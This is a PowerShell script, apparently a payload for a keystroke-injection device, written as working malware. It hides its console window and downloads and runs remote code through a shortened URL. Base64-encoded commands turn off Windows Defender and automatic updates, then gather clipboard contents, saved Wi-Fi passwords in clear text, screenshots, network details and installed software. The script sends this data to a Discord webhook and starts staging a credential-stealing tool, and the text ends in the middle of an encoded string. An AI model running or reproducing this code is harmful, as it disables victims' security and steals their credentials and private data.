#Hide-Powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetConsoleWindow();
}
"@

$SW_HIDE = 0;
$consolePtr = [User32]::GetConsoleWindow();
[User32]::ShowWindow($consolePtr, $SW_HIDE);

#Disable
irm https://rb.gy/kce89x | iex;

#Ducky-Exfil
powershell -e CgAKAAoAUwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAFUAbgByAGUAcwB0AHIAaQBjAHQAZQBkACAALQBGAG8AcgBjAGUAOwAgAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAUwBjAHIAaQBwAHQAUwBjAGEAbgBuAGkAbgBnACAAJAB0AHIAdQBlADsACgBOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsADsACgAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALQBOAGEAbQBlACAAIgBEAGkAcwBhAGIAbABlAEEAbgB0AGkAUwBwAHkAdwBhAHIAZQAiACAALQBWAGEAbAB1AGUAIAAxADsACgAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUgBlAGEAbAAtAFQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACIAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAKACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUgBlAGEAbAAtAFQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACIAIAAtAE4AYQBtAGUAIAAiAEQAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIgAgAC0AVgBhAGwAdQBlACAAMQA7AAoAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAIgAgAC0ATgBhAG0AZQAgACIARABpAHMAYQBiAGwAZQBSAG8AdQB0AGkAbgBlAGwAeQBUAGEAawBpAG4AZwBBAGMAdABpAG8AbgAiACAALQBWAGEAbAB1AGUAIAAxADsACgAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALQBOAGEAbQBlACAAIgBTAGUAcgB2AGkAYwBlAEsAZQBlAHAAQQBsAGkAdgBlACIAIAAtAFYAYQBsAHUAZQAgADAAOwAKACAATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAFMAZQBjAHUAcgBpAHQAeQBIAGUAYQBsAHQAaABTAGUAcgB2AGkAYwBlACIAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAKACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABTAGUAYwB1AHIAaQB0AHkASABlAGEAbAB0AGgAUwBlAHIAdgBpAGMAZQAiACAALQBOAGEAbQBlACAAIgBTAHQAYQByAHQAIgAgAC0AVgBhAGwAdQBlACAANAA7AAoAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAVABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBNAEEAUABTAFIAZQBwAG8AcgB0AGkAbgBnACAAMAA7ACAAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAAJAB0AHIAdQBlADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQAgADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAOwAgAFMAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIAdwB1AGEAdQBzAGUAcgB2ACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7ACAATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIgAgAC0ATgBhAG0AZQAgACIAVwBpAG4AZABvAHcAcwBVAHAAZABhAHQAZQAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAOwAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AZABvAHcAcwBVAHAAZABhAHQAZQAiACAALQBOAGEAbQBlACAAIgBBAFUAIgAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AZABvAHcAcwBVAHAAZABhAHQAZQBcAEEAVQAiACAALQBOAGEAbQBlACAAIgBOAG8AQQB1AHQAbwBVAHAAZABhAHQAZQAiACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAG8AcgBkADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAFwAQQBVACIAIAAtAE4AYQBtAGUAIAAiAEEAVQBPAHAAdABpAG8AbgBzACIAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcAbwByAGQAOwAKAAoACgAKAAoACgAKAA==;

#Lazagne
powershell -e CgAKAAoAIAAgACQAdQByAGwAPQAiAGgAdAB0AHAAcwA6AC8ALwBkAGkAcwBjAG8AcgBkAC4AYwBvAG0ALwBhAHAAaQAvAHcAZQBiAGgAbwBvAGsAcwAvADEAMgA1ADgAOQA1ADEANwAxADIAMwA3ADUANQA3ADAANQAyADMALwBaAHoAVgBSAEcASQA4AEcAdQBtAFEAagBUAFMAegBfAHMAMgBnAGUAVABTAFgATgBzAGsAMAB0AEUAOQB6AHAANQBfADUANgB4AEcAdQA5AHUAMgBHAEUASAB3AGoATABtAFgAaABzAFkAUABMADQARwA0AEcATQBZAEcAbQBqAE8AQwAzAGYAIgAgADsACgAKACAAIAAkAG4AYQBtAGUAcABjACAAPQAgAEcAZQB0AC0ARABhAHQAZQAgAC0AVQBGAG8AcgBtAGEAdAAgACIAJABlAG4AdgA6AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlAC0AJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQAtACUAbQAtACUAZAAtACUAWQBfACUASAAtACUATQAtACUAUwAiADsACgAKAAoAIAAgAGUAYwBoAG8AIAAiACIAIAA+ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHMAdABhAHQAcwAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiADsACgAgACAAZQBjAGgAbwAgACIAIwAjACMAIwBQAEMAIABDAGwAaQBwAEIAbwBhAHIAZAAgAHUAbgBkAGUAcgAgAHQAaABpAHMAIABsAGkAbgBlADoAIgAgAD4APgAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABzAHQAYQB0AHMALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoAIAAgAGUAYwBoAG8AIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACIAIAA+AD4AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAcwB0AGEAdABzAC0AJABuAGEAbQBlAHAAYwAuAHQAeAB0ACIAOwAKACAAIABHAGUAdAAtAEMAbABpAHAAYgBvAGEAcgBkACAAPgA+ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHMAdABhAHQAcwAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiADsACgAgACAAZQBjAGgAbwAgACIAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIgAgAD4APgAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABzAHQAYQB0AHMALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoAIAAgAGUAYwBoAG8AIAAiACMAIwAjACMARQBuAGQAIABDAGwAaQBwAEIAbwBhAHIAZAAiACAAPgA+ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHMAdABhAHQAcwAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiADsACgAKAAoAZQBjAGgAbwAgACIAIgAgAD4AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAVwBJAEYASQAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiADsACgAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQBzACkAIAB8ACAAUwBlAGwAZQBjAHQALQBTAHQAcgBpAG4AZwAgACIAXAA6ACgALgArACkAJAAiACAAfAAgACUAewAkAG4AYQBtAGUAPQAkAF8ALgBNAGEAdABjAGgAZQBzAC4ARwByAG8AdQBwAHMAWwAxAF0ALgBWAGEAbAB1AGUALgBUAHIAaQBtACgAKQA7ACAAJABfAH0AIAB8ACAAJQB7ACgAbgBlAHQAcwBoACAAdwBsAGEAbgAgAHMAaABvAHcAIABwAHIAbwBmAGkAbABlACAAbgBhAG0AZQA9ACIAJABuAGEAbQBlACIAIABrAGUAeQA9AGMAbABlAGEAcgApAH0AIAB8ACAAbwB1AHQALQBmAGkAbABlACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAFcASQBGAEkALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoACgAKACAAIABjAGQAIAAiACQAZQBuAHYAOgB0AGUAbQBwACIAOwAKACAAIABlAGMAaABvACAAJwBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAFMAYwByAGUAZQBuAEMAYQBwAHQAdQByAGUAJwAgAD4AIAAiAGQALgBwAHMAMQAiADsACgAgACAAZQBjAGgAbwAgACcAewAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnACAAIAAgACAAYgBlAGcAaQBuACAAewAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnACwAIABTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgACAAIAAgACAAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnACAAIAAgACAAIAAgACAAIAAkAGoAcABlAGcAQwBvAGQAZQBjACAAPQAgAFsARAByAGEAdwBpAG4AZwAuAEkAbQBhAGcAaQBuAGcALgBJAG0AYQBnAGUAQwBvAGQAZQBjAEkAbgBmAG8AXQA6ADoARwBlAHQASQBtAGEAZwBlAEUAbgBjAG8AZABlAHIAcwAoACkAIAB8ACcAIAA+AD4AIAAiAGQALgBwAHMAMQAiADsACgAgACAAZQBjAGgAbwAgACcAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAJABfAC4ARgBvAHIAbQBhAHQARABlAHMAYwByAGkAcAB0AGkAbwBuACAALQBlAHEAIAAiAEoAUABFAEcAIgAgAH0AJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgAH0AJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgAHAAcgBvAGMAZQBzAHMAIAB7ACcAIAA+AD4AIAAiAGQALgBwAHMAMQAiADsACgAgACAAZQBjAGgAbwAgACcAIAAgACAAIAAgACAAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA0ADQAJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBTAGUAbgBkAGsAZQB5AHMAXQA6ADoAUwBlAG4AZABXAGEAaQB0ACgAIgB7AFAAcgB0AFMAYwB9ACIAKQAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAE0AaQBsAGwAaQBzAGUAYwBvAG4AZABzACAANQA1ADAAJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgACAAIAAgACAAJABiAGkAdABtAGEAcAAgAD0AIABbAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABJAG0AYQBnAGUAKAApACcAIAA+AD4AIAAiAGQALgBwAHMAMQAiADsACgAgACAAZQBjAGgAbwAgACcAIAAgACAAIAAgACAAIAAgACQAZQBwACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABEAHIAYQB3AGkAbgBnAC4ASQBtAGEAZwBpAG4AZwAuAEUAbgBjAG8AZABlAHIAUABhAHIAYQBtAGUAdABlAHIAcwAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnACAAIAAgACAAIAAgACAAIAAkAGUAcAAuAFAAYQByAGEAbQBbADAAXQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAARAByAGEAdwBpAG4AZwAuAEkAbQBhAGcAaQBuAGcALgBFAG4AYwBvAGQAZQByAFAAYQByAGEAbQBlAHQAZQByACAAKABbAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEkAbQBhAGcAaQBuAGcALgBFAG4AYwBvAGQAZQByAF0AOgA6AFEAdQBhAGwAaQB0AHkALAAgAFsAbABvAG4AZwBdADEAMAAwACkAJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgACAAIAAgACAAJABzAGMAcgBlAGUAbgBDAGEAcAB0AHUAcgBlAFAAYQB0AGgAQgBhAHMAZQAgAD0AIAAkAGUAbgB2ADoAdABlAG0AcAAgACsAIAAiAFwAIgAgACsAIAAkAGUAbgB2ADoAVQBzAGUAcgBOAGEAbQBlACAAKwAgACIAXwBDAGEAcAB0AHUAcgBlACIAJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwAgACAAIAAgACAAIAAgACAAJABiAGkAdABtAGEAcAAuAFMAYQB2AGUAKAAiACQAewBzAGMAcgBlAGUAbgBDAGEAcAB0AHUAcgBlAFAAYQB0AGgAQgBhAHMAZQB9AC4AagBwAGcAIgAsACAAJABqAHAAZQBnAEMAbwBkAGUAYwAsACAAJABlAHAAKQAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnACAAIAAgACAAfQAnACAAPgA+ACAAIgBkAC4AcABzADEAIgA7AAoAIAAgAGUAYwBoAG8AIAAnAH0AJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABlAGMAaABvACAAJwBHAGUAdAAtAFMAYwByAGUAZQBuAEMAYQBwAHQAdQByAGUAJwAgAD4APgAgACIAZAAuAHAAcwAxACIAOwAKACAAIABzAGwAZQBlAHAAIAAxAAoAIAAgACQAcwBjAHIAZQBlAG4AYwBhAHAAdAB1AHIAZQAgAD0AIABlAGMAaABvACAAJABlAG4AdgA6AHQAZQBtAHAAIgBcACIAJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQAiAF8AQwBhAHAAdAB1AHIAZQAiAAoAIAAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAGMAIAAkAGUAbgB2ADoAdABlAG0AcABcAGQALgBwAHMAMQA7AAoAIAAgACQAUwBjAHIAZQBlAG4AYwBhAHAAIAA9ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAGQALgBwAHMAMQAiADsACgAKAAoAIAAgAGQAaQByACAAZQBuAHYAOgAgAD4APgAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABzAHQAYQB0AHMALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoACgAgACAARwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdAAvAFMAZQBjAHUAcgBpAHQAeQBDAGUAbgB0AGUAcgAyACAALQBDAGwAYQBzAHMATgBhAG0AZQAgAEEAbgB0AGkAdgBpAHIAdQBzAFAAcgBvAGQAdQBjAHQAIAA+AD4AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAcwB0AGEAdABzAC0AJABuAGEAbQBlAHAAYwAuAHQAeAB0ACIAOwAKAAoAIAAgACQAcAB1AGIAaQBwACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AdQByAGkAIAAiAGgAdAB0AHAAOgAvAC8AaQBmAGMAbwBuAGYAaQBnAC4AbQBlAC8AIgApAC4AQwBvAG4AdABlAG4AdAAKACAAIABlAGMAaABvACAAIgBQAFUAQgBMAEkAQwAgAEkAUAA6ACAAJABwAHUAYgBpAHAAIgAgAD4APgAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABzAHQAYQB0AHMALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoACgAgACAAaQBwAGMAbwBuAGYAaQBnACAALwBhAGwAbAAgAD4APgAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABzAHQAYQB0AHMALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoACgAgACAAZQBjAGgAbwAgACIASQBuAHMAdABhAGwAbABlAGQAIABTAG8AZgB0AHcAYQByAGUAOgAiACAAPgA+ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHMAdABhAHQAcwAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiADsACgAgACAARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAEgASwBMAE0AOgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFUAbgBpAG4AcwB0AGEAbABsAFwAKgAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAARABpAHMAcABsAGEAeQBOAGEAbQBlACwAIABEAGkAcwBwAGwAYQB5AFYAZQByAHMAaQBvAG4ALAAgAFAAdQBiAGwAaQBzAGgAZQByACwAIABJAG4AcwB0AGEAbABsAEQAYQB0AGUAIAB8ACAARgBvAHIAbQBhAHQALQBUAGEAYgBsAGUAIAAtAEEAdQB0AG8AUwBpAHoAZQAgAD4APgAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABzAHQAYQB0AHMALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgA7AAoAIAAgAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABVAG4AaQBuAHMAdABhAGwAbABcACoAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEQAaQBzAHAAbABhAHkATgBhAG0AZQAsACAARABpAHMAcABsAGEAeQBWAGUAcgBzAGkAbwBuACwAIABQAHUAYgBsAGkAcwBoAGUAcgAsACAASQBuAHMAdABhAGwAbABEAGEAdABlACAAfAAgAEYAbwByAG0AYQB0AC0AVABhAGIAbABlACAALQBBAHUAdABvAFMAaQB6AGUAIAA+AD4AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAcwB0AGEAdABzAC0AJABuAGEAbQBlAHAAYwAuAHQAeAB0ACIAOwAKAAoACgBjAGQAIAAkAGUAbgB2ADoAdABlAG0AcAAKAAoAIAAgACQAQgBvAGQAeQA9AEAAewAgAGMAbwBuAHQAZQBuAHQAIAA9ACAAIgAqACoAUwB0AGEAdABzACAAZgByAG8AbQAgAEYAbABpAHAAcABlAHIALQBaAGUAcgBvACAAbwBuACAAdQBzAGUAcgA6ACoAKgAgACQAZQBuAHYAOgBVAHMAZQByAE4AYQBtAGUALAAgAG8AbgAgAHAAYwA6ACAAJABlAG4AdgA6AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlACIAfQA7AAoAIAAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAJwBBAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBKAHMAbwBuACcAIAAtAFUAcgBpACAAJAB1AHIAbAAgACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAoACQAQgBvAGQAeQAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AKQA7AAoACgAgACAAYwB1AHIAbAAuAGUAeABlACAALQBGACAAIgBmAGkAbABlADEAPQBAAHMAdABhAHQAcwAtACQAbgBhAG0AZQBwAGMALgB0AHgAdAAiACAAJAB1AHIAbAA7AAoACgAgACAAYwB1AHIAbAAuAGUAeABlACAALQBGACAAIgBmAGkAbABlADIAPQBAAFcASQBGAEkALQAkAG4AYQBtAGUAcABjAC4AdAB4AHQAIgAgACQAdQByAGwAOwAKAAoACgAgACAAcwBsAGUAZQBwACAAMQAKACAAIAAkAEIAbwBkAHkAPQBAAHsAIABjAG8AbgB0AGUAbgB0ACAAPQAgACIAKgAqAFMAYwByAGUAZQBuACAAQwBhAHAAdAB1AHIAZQAgAGIAZQBmAG8AcgBlACAAYQB0AHQAYQBjAGsAIABzAHQAYQByAHQAKgAqACIAfQA7AAoAIAAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAJwBBAHAAcABsAGkAYwBhAHQAaQBvAG4ALwBKAHMAbwBuACcAIAAtAFUAcgBpACAAJAB1AHIAbAAgACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAoACQAQgBvAGQAeQAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AKQA7AAoAIAAgAGMAdQByAGwALgBlAHgAZQAgAC0ARgAgACIAZgBpAGwAZQAyAD0AQAAkAHMAYwByAGUAZQBuAGMAYQBwAHQAdQByAGUALgBqAHAAZwAiACAAJAB1AHIAbAA7AAoACgAKACAAIAAkAHcAZQBiAGgAbwBvAGsAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZABpAHMAYwBvAHIAZAAuAGMAbwBtAC8AYQBwAGkALwB3AGUAYgBoAG8AbwBrAHMALwAxADIANQA4ADkANQAxADcAMQAyADMANwA1ADUANwAwADUAMgAzAC8AWgB6AFYAUgBHAEkAOABHAHUAbQBRAGoAVABTAHoAXwBzADIAZwBlAFQAUwBYAE4AcwBrADAAdABFADkAegBwADUAXwA1ADYAeABHAHUAOQB1ADIARwBFAEgAdwBqAEwAbQBYAGgAcwBZAFAATAA0AEcANABHAE0AWQBHAG0AagBPAEMAMwBmACIAOwAKACAAIAAkAHYAZQByAHMAaQBvAG4AIAA9ACAAIgAyAC4ANAAuADUAIgA7AAoAIAAgACQAVABlAG0AcABGAGkAbABlACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB0AGUAbQBwAC4AcABzADEAIgA7ACAAJABGAGkAbABlACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABsAC4AcABzADEAIgA7ACAAZQBjAGgAbwAgADcANwB1AC8ASgBFAGwAegBRAFcAUgB0AGEAVwA0AGcAUABTAEIATwBaAFgAYwB0AFQAMgBKAHEAWgBXAE4AMABJAEYATgBsAFkAMwBWAHkAYQBYAFIANQBMAGwAQgB5AGEAVwA1AGoAYQBYAEIAaABiAEMANQBYAGEAVwA1AGsAYgAzAGQAegBVAEgASgBwAGIAbQBOAHAAYwBHAEYAcwBLAEYAdABUAFoAVwBOADEAYwBtAGwAMABlAFMANQBRAGMAbQBsAHUAWQAyAGwAdwBZAFcAdwB1AFYAMgBsAHUAWgBHADkAMwBjADAAbABrAFoAVwA1ADAAYQBYAFIANQBYAFQAbwA2AFIAMgBWADAAUQAzAFYAeQBjAG0AVgB1AGQAQwBnAHAASwBRADAASwBKAEUARgBrAGIAVwBsAHUASQBEADAAZwBKAEUAbAB6AFEAVwBSAHQAYQBXADQAdQBTAFgATgBKAGIAbABKAHYAYgBHAFUAbwBXADEATgBsAFkAMwBWAHkAYQBYAFIANQBMAGwAQgB5AGEAVwA1AGoAYQBYAEIAaABiAEMANQBYAGEAVwA1AGsAYgAzAGQAegBRAG4AVgBwAGIASABSAEoAYgBsAEoAdgBiAEcAVgBkAE8AagBwAEIAWgBHADEAcABiAG0AbAB6AGQASABKAGgAZABHADkAeQBLAFEAMABLAEoARwBSAHAAYwBpAEEAOQBJAEMA